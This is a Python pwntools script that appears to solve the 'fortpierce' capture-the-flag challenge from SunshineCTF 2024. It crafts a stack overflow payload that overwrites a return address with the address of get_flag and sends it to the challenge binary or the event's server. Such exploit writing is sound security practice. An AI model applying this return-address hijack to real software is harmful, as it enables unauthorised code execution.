#!/usr/bin/env python3

from pwn import *

REMOTE = True if args.REMOTE else False
FILE = r'./fortpierce'
HOST, PORT = r'2024.sunshinectf.games', 24606

def main():
    elf = ELF(FILE)
    context.binary = elf

    order = ['e0', 'ae', '88', 'd4', 'd7', '91', 'b1', 'b8', '86', 'c0']
    diffs = [int(order[i], 16) - int(order[i+1], 16) for i in range(0, len(order)-1)]

    payload = [b'_'] * max([sum(diffs[:i]) for i in range(len(diffs))]) + [b'_']

    string = iter(b'fuzzysocks')
    i = 0
    for diff in diffs:
        payload[i] = next(string).to_bytes(1)
        i += diff
    payload[i] = next(string).to_bytes(1)

    payload = b''.join(payload) + b'_' * 21 + p64(elf.sym.get_flag)

    with (process(FILE) if not REMOTE else remote(HOST, PORT)) as r:
        r.sendlineafter(b': ', payload)

        r.interactive()


if __name__ == '__main__':
    context.log_level = 'error'
    main()
